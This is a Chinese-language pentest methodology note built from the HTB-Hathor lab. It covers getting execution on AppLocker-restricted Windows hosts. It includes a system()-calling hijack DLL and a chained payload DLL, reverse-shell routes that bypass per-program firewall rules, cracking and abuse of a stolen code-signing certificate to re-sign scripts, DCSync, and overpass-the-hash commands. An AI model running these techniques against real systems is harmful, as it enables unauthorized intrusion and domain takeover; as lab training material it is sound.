# Windows 执行受限主机：宿主内执行 / DLL 劫持 / 代码签名滥用

> 来源：HTB-Hathor 实战（2026-09-21，Windows Server 2022 域控，Web 立足 → 域管）。适用于**三类现象同时出现**的主机：AppLocker 白名单生效、防火墙**按程序**拦截出站、暂存文件与脚本会被**周期性还原**。
> 二手结论取自 0xdf 的 writeup（<https://0xdf.gitlab.io/2022/11/19/htb-hathor.html>，2022-11-19）；正文凡引用处均已显式标注「来源：0xdf writeup」，未标注者为本会话实测或官方文档。
> 触发场景：已有 Windows 立足点（Web 执行点 / 低权 shell），但落地 exe 被拦、PowerShell 受限、反连打不回来。
> 分工：域内初始立足见 `ad-initial-access.md`；拿到域凭据后的横向/提权见 `ad-post-compromise.md`；本机提权枚举见 `privesc-linux-windows.md`；文件传输与破解矩阵见 `field-ops-toolbox.md`。
> **仅限授权测试**：本 note 的 DLL 植入、反连 exe、脚本重签均属 SKILL.md Phase 4「可执行代码」授权项。

---

## 0. 决策流程

```
已有 Windows 立足点，但落地不了 exe / 反连被拦
   ↓ §1 先判环境（AppLocker 策略 / 出站规则 / PowerShell 语言模式 / 是否周期还原）
   ↓ §2 换提问方式：不问"怎么让我的程序跑"，问"谁已经被信任在执行"
   ↓ §3 DLL 劫持四步法（可写 × 会被加载 × 在白名单）
   ↓ §4 反连两条路：宿主进程内发起（ASPX/.NET）或借被放行的 exe（防火墙按程序拦）
   ↓ §5 需要过签名 → 找代码签名证书（回收站/共享）→ pfx2john/john → 重签脚本
   ↓ §6 周期还原环境：暂存放 C:\Programdata；多步串进 DLL 抢时间窗（幂等自动重试）
   ↓ §7 拿到高权上下文 → DCSync（DSInternals）→ NTLM 禁用时 overpass-the-hash
```

## 1. 环境判定（四查，全部只读）

| 查什么 | 命令 | 判读 |
|---|---|---|
| AppLocker 策略 | `powershell -c "Get-AppLockerPolicy -Effective -Xml" > C:\Programdata\al.xml` | 看 DLL / Exe / Script 三类规则。⚠️ 该 cmdlet **只对 GP 下发的策略有效**，本机策略要用 `-Local`（微软文档明示）；若 PS 受限读不到，退化为行为验证（试跑被拦的程序看报错）。判读形态（来源：0xdf HTB-Hathor writeup 2022-11-19 的策略 dump）：**按路径放行的 DLL 与 EXE（如 `C:\share\scripts\x.dll`、`C:\share\x.exe`）就是留好的执行点**；显式拦 `mshta`/`msbuild`/`installutil`/`msdt` 等说明常规绕过已被防 |
| 出站防火墙 | `powershell -c "Get-NetFirewallRule -PolicyStore ActiveStore \| ? {$_.Action -eq 'Block'} \| Get-NetFirewallApplicationFilter \| select -ExpandProperty Program"` | **命令语法已在 Windows 11 实测通过（2026-09-22，只读）**；等价写法 `Get-NetFirewallRule -PolicyStore ActiveStore -Action Block \| Get-NetFirewallApplicationFilter -PolicyStore ActiveStore` 同样可用（无程序过滤的规则会输出 `Any`）。判读：拦截**按程序**生效 ⇒ **反连要换进程宿主，而不是换端口**。本案形态（来源：0xdf writeup）：16 条按程序拦出站，命中 `cscript`/`powershell`/`powershell_ise`/`regsvr32`/`rundll32`/`wscript` |
| PowerShell 语言模式 | `$ExecutionContext.SessionState.LanguageMode` | `ConstrainedLanguage` ⇒ 别指望 PS 脚本开箱即用（`New-Object` 之类会失败）。**该状态通常只出现在应用池/低权身份**（0xdf writeup 实测：应用池身份 `web` 即 ConstrainedLanguage），而**交互式登录的服务账号往往是 FullLanguage**（本案 `ginawild` 的 PS 可直接跑 `Import-PfxCertificate`/`Set-AuthenticodeSignature`）⇒ §5 的签名动作要在后者上下文里做 |
| 是否周期还原 | 同一目录两次 `dir` 比 mtime；放进去的暂存文件是否消失 | HTB-Hathor 实测：道具目录（`C:\share`）与目标脚本会自己变回原样 ⇒ 按 §6 作战 |

SMB 侧两个先验（来自 Nmap 与 nxc）：`Message signing enabled and required` ⇒ **中继认证到 SMB 不成立**（中继者拿不到会话密钥、无法签名），但**不影响用有效凭据正常登录**；`(NTLM:False)` ⇒ 认证只能走 Kerberos。

## 2. 提问方式（本 note 的核心）

执行被封锁时，攻击面不在"我能不能跑 exe"，而在**信任链的接缝**：

1. **谁被信任在执行**？（计划任务、服务、IIS 宿主、签名过的脚本）
2. **我能写它的哪一部分**？（DLL、配置、被加载的脚本、被覆盖的 exe）
3. **同一系统里哪两份校验口径不一致**？HTB-Hathor 的两个实例：共享拦 `.exe` 写入却允许 `.dll`；上传接口拦后缀、Copy 接口却不拦目标名 —— **规则不一致的接缝通常就是洞**。

## 3. DLL 劫持四步法

**① 找点**：可写目录 × 被加载的文件 × 在 AppLocker 白名单里。典型形态是"同名脚本 + DLL 同目录"。本案的"被加载"是这样确认的：0xdf writeup 读 `7Zip.au3` 源码确认了脚本对 `7-zip64.dll` 的引用关系，我们再用**行为**确认（把 DLL 换成只做 ping 的版本，抓包收到 ICMP ⇒ 它确实被加载执行）。

**怎么判断"谁在周期性执行"**（决定植入时机与重试节奏）：

- **行为确认**（本案实测）：把无害 DLL 覆盖上去后等一轮触发，用抓包（ICMP）或结果文件是否出现来判断周期存在；同一目录两次 `dir` 比 mtime 也能看出文件被反复刷新。
- **进程轮询**（来源：0xdf writeup 实测）：

  ```cmd
  FOR /L %i IN (1,1,60) DO (tasklist /FI "imagename eq <可疑 exe 名>" | findstr /v "No tasks" & ping -n 2 127.0.0.1 > NUL)
  ```
  该案观察到 AutoIt 约 30 秒一波、随之 Bginfo 约 10 秒一波 —— 周期与**持续时长**决定了"覆盖 DLL 的安全窗口"。
- **计划任务清单**（通行做法；本案未逐条核验其输出）：`schtasks /query /fo LIST /v | findstr /I "TaskName Task To Run Run As User"` —— `Task To Run` 直接给出执行者路径与运行身份（据此可确认它是否会加载我们改的文件）。

**② 写探针矩阵**（同一份字节、只换扩展名，逐个写入）：

| 探针 | HTB-Hathor 实测 | 含义 |
|---|---|---|
| `probe.txt` | ✅ 可写 | 基线 |
| `probe.dll` | ✅ 可写 | **入口** |
| `probe.exe` | ❌ `STATUS_ACCESS_DENIED` | 服务端按扩展名过滤写入 |

只改变一个变量的对照实验，一次分清"权限问题 / 内容问题 / 扩展名问题"。（**过滤发生在哪一层**——只作用于 SMB 写入路径，还是仅拦新建 exe——见 §4 末的待验证说明。）

**③ 自编最小 DLL**（`DllMain` + `system()`）：

```c
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c ping -n 4 <攻击机 IP>");   // 第一发必须无害
    }
    return TRUE;
}
```

```bash
x86_64-w64-mingw32-gcc -shared -O2 -s -o target.dll dll.c    # 位数必须与加载者一致
file target.dll && ls -l target.dll                          # 自检：PE32+ DLL x86-64；大小应为几 KB
```

- **不要用 msfvenom 生成的 DLL**：来源 0xdf HTB-Hathor writeup（2022-11-19）实测 —— msfvenom 出的 DLL 被 Defender 直接删除（文件消失、稍后原件被还原）；本案我们直接走自编 `system()` DLL，**全程未被删除**（§3 探针与后续 ginawild shell 均通过它取得）。
- 覆盖后**等一个任务周期**，用抓包确认执行：`tcpdump -ni tun0 icmp` 看到 `ping -n 4` 的四个请求即成立（本案实测：四个 ICMP 请求、间隔 1 秒）。
- 加载中的文件是锁的：写入报错就重试；写入后 `ls` 复核大小，确认没被还原。

**④ 升级为真实动作**：确认执行后，把 DLL 内容换成真实 payload（复制文件、写结果文件、拉起被放行的 exe）。

## 4. 反连的两条路

| 路线 | 做法 | 为什么可行 |
|---|---|---|
| **宿主进程内发起** | 用宿主语言写反连（经典 ASP.NET 站点 → 上传 `.aspx`，`TcpClient` 连回后把命令交给 `cmd.exe`） | 代码跑在 `w3wp.exe` 内：不落地 exe（过 AppLocker），连接从宿主进程出（绕开按程序拦的出站规则） |
| **借被放行的 exe** | 把自编反连 exe 覆盖成白名单内的 exe（如 `C:\share\Bginfo64.exe`），再由脚本/任务拉起 | 该路径被 AppLocker 放行；且据 0xdf writeup，它**不在出站拦截名单**里（本案实测：该 exe 被拉起后确实成功反连） |

覆盖 exe 的手段：**在目标机内部用本地复制**。HTB-Hathor 实测 SMB 写 `.exe` 被拒，但机内 `copy /y <payload>.txt C:\share\<allowed>.exe` 成功。
> 与 §3 探针的差异未进一步区分：可能是"过滤只作用于 SMB 写入路径"，也可能是"只拦新建 exe"——两种解释都与观测一致，按待验证项记录。

## 5. 代码签名证书滥用（过 AppLocker 脚本规则）

**① 去哪儿找**：用户回收站 `C:\$Recycle.Bin\<SID>\$R*.pfx`（`dir /a /s C:\$Recycle.Bin`）、共享、家目录、配置文件引用。

**② 破口令**（Kali 无 `crackpkcs12` 包，改用 john）：

```bash
apt install -y john                      # john 需带 jumbo 补丁（Kali 自带）；pfx2john.py 依赖 asn1crypto
python3 -c "import asn1crypto" || python3 -m pip install --user asn1crypto   # 缺依赖时按脚本自身提示装
python3 /usr/share/john/pfx2john.py stolen.pfx > pfx.hash
john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash && john --show pfx.hash
```
来源：HTB-Hathor 实测（弱口令，秒出）。依赖依据：`pfx2john.py` 源码在缺 asn1crypto 时会报 `asn1crypto is missing, run 'pip install --user asn1crypto'`。

**③ 重签**（两条路）：

```powershell
# 机内（Windows 原生，注意路径含 $ 必须单引号）
$pass = ConvertTo-SecureString -String '<pfx 口令>' -AsPlainText -Force
$cert = Import-PfxCertificate -FilePath 'C:\$Recycle.Bin\<SID>\$RXXXXXX.pfx' -Password $pass -CertStoreLocation Cert:\CurrentUser\My
$cert | Format-List Subject,Thumbprint
Set-AuthenticodeSignature -FilePath C:\path\target.ps1 -Certificate $cert | Format-List Status
# 期望 Status : Valid，且 SignerCertificate 的 Subject 与 AppLocker 信任的签名者一致
```

```bash
# 备用路线（本案未实测）：osslsigncode 官方 README 明确支持 .ps1 / .ps1xml / .psc1 / .psd1 / .psm1 / .cdxml / .mof / .js
osslsigncode sign -pkcs12 stolen.pfx -pass '<pfx 口令>' -h sha256 -in mod.ps1 -out signed.ps1
```
> 本案实际走的是上面的**机内 `Set-AuthenticodeSignature`**（已实测 `Status : Valid`）；Kali 侧这条留作没有可用 PowerShell 上下文时的替代方案。

**④ 内联执行不受脚本规则约束**：AppLocker 的 Script 规则**只涵盖脚本文件格式**——微软《[Script rules in AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/script-rules-in-applocker)》原文列出的是 `.ps1 .bat .cmd .vbs .js` 这些**文件**；`powershell -nop -c "…"` 这类内联命令不落地上述任何文件格式，因此不在该规则管辖内（**本案实测**：机内重签动作正是用内联 `-c` 完成，并成功取得 `Status : Valid`）。
> 顺带：`dot-source` / `Import-Module` 加载的 `.ps1`/`.psm1` 并非"被脚本宿主以文件形式启动"，理论上同样不受限 —— 这一条属**推断，本案未实测**（本案改的是主脚本本体）。

**⑤ 触发**：改脚本 → 重签 → 触发**原本就会运行该脚本的计划任务**。HTB-Hathor 的形态：`run.vbs` 用 `eventcreate` 写一条 Event ID `444`，计划任务监听该事件、以**另一个高权账号**执行审计脚本 —— 于是我们借"签名过 + 高权上下文"的脚本拿到了下一个域身份。

## 6. 周期还原环境的作战纪律

1. **暂存换位置**：会被还原的目录（`C:\share` 这类"道具目录"）只用于投放；持久暂存放 `C:\Programdata`，payload 先读那里。
2. **多步同窗**：覆盖 → 签名 → 触发必须挤进同一时间窗（HTB-Hathor 把三步写进一个 DLL，毫秒级连做；人工节奏会被还原吃掉，表现为"文件不存在了 / 脚本变回原版"）。
3. **幂等 + 自动重试**：把整条链挂到"每次都会重新加载我们 DLL 的计划任务"上 —— 共享被清、DLL 被还原都只是下一轮自动重跑，不需要人守。

DLL 版的形态（每条 `system()` 一步）：

```c
if (reason == DLL_PROCESS_ATTACH) {
    system("cmd.exe /c copy /y C:\\share\\payload.txt C:\\Programdata\\payload.txt");      // 先持久化
    system("cmd.exe /c copy /y C:\\Programdata\\payload.txt C:\\<目标脚本路径>");           // 覆盖
    system("powershell -nop -c \"<导入 pfx + Set-AuthenticodeSignature 内联命令>\"");        // 重签
    system("cmd.exe /c cscript C:\\<触发脚本>");                                            // 触发
    Sleep(25000);
    system("cmd.exe /c copy /y C:\\Programdata\\result.txt C:\\share\\result.txt");          // 结果回抄
}
```

## 7. 从域内 Windows 主机做 DCSync，以及 NTLM 禁用时的取票

```powershell
"IDENTITY: $(whoami)" | Out-File -Encoding utf8 C:\Programdata\dc.txt        # 先自证执行身份
Import-Module DSInternals
Get-ADReplAccount -SamAccountName administrator -Server <DC FQDN> 2>&1 | Out-File -Append -Encoding utf8 C:\Programdata\dc.txt
Copy-Item C:\Programdata\dc.txt C:\<可读共享>\dc.txt -Force                  # 回抄便于取回
```
> 本节只保留"在执行受限主机上怎么落地"的形态；**cmdlet 参数、输出字段解读、与 KrbRelay 的分界见 `ad-post-compromise.md` §2.8**（避免两处重复维护）。

- 前提：运行账号具备 `Replicating Directory Changes` / `...All`。**本案实测**：该审计工具（Get-bADpasswords）的运行账号即具备 —— 工具本身就是靠复制协议读取密码哈希，所以"先拿审计类工具的运行账号"通常是这条路的入口；是否普遍成立以该工具的 README 为准。
- 输出含 `NTHash`、`NTHashHistory` 与 `KerberosNew.AES256/AES128 Key`（本案实测输出形态）。**RC4 被禁时用 AES key 走 keytab/`ktutil` 取票**——此路为备用方案，**本案未实测**（本案 RC4 可用，`getTGT -hashes` 一次成功）。
- 结果先写 `C:\Programdata` 再回抄共享，避免依赖交互 shell（对"没有稳定 shell"的场景尤其重要）。
- **NTLM 禁用 ⇒ 不能 Pass-the-Hash**，改走 overpass-the-hash：

```bash
impacket-getTGT <domain>/Administrator -hashes :<NT hash> -dc-ip <DC IP>
export KRB5CCNAME=$PWD/Administrator.ccache
impacket-wmiexec -k -no-pass <domain>/Administrator@<DC FQDN>
```

## 8. 命令与引号坑（除标注「来源：HTB-Absolute」一行外，其余均为本案实测）

| 现象 | 正确做法 |
|---|---|
| SMB 投递（`put` 语义 / 管道挂死 / 脚本化上传） | **细节见 `field-ops-toolbox.md` §2「脚本化投递」**：`impacket-smbclient` 的 `put` 只接受一个参数（远端名=basename、落远端当前目录）、喂管道会卡死、改用 `SMBConnection.putFile` 或 `nxc --put-file`（须配 `--share`） |
| PowerShell 里 `copy /y a b` 报「找不到接受参数」 | `copy` 是 `Copy-Item` 的别名，用 `Copy-Item -Force` |
| `Import-PfxCertificate` 报 `The PFX file could not be found` | 路径含 `$`（`$Recycle.Bin`、`$RXXXXXX.pfx`）**必须单引号**，双引号会被当变量展开 |
| `nxc … --use-kcache` 报 `KRB5CCNAME environment variable is not set` | 先 `export KRB5CCNAME=/tmp/krb5cc_1000`（`kinit` 默认 ccache） |
| Kerberos 场景用了 IP 或短名（来源：HTB-Absolute 实测） | 一律用 **FQDN**（SPN 依赖主机名），并保证 `/etc/hosts` 里 FQDN 行排在裸域名之前（MIT krb5/Samba 取 getaddrinfo 第一个名字推 SPN） |
| 通过 AI 桥接执行命令时 `~` 不展开 | 桥接 shell 的 `$HOME` 可能为空，路径一律写绝对路径 |

## 9. 红线与纪律段

1. **仅限授权测试**：DLL 植入、反连、脚本重签均属"可执行代码"授权项（SKILL.md Phase 4）；未授权时止步于"路径存在证明"。
2. **破坏性最小化**：优先覆盖"会被自动重建/还原"的文件；任何业务文件替换前**先备份原件**并留回滚路径（HTB-Hathor 全程保留 `.orig` 备份）。
3. **痕迹清单**：投放的 DLL/exe、被替换的目标文件、`C:\Programdata` 下的结果文件、被重签的脚本 —— 报告附录逐条列出并提供还原方式。
4. **凭据脱敏**：pfx 口令、NT hash、Kerberos AES key 一律以占位符形式记录（本 note 即如此），不落明文。
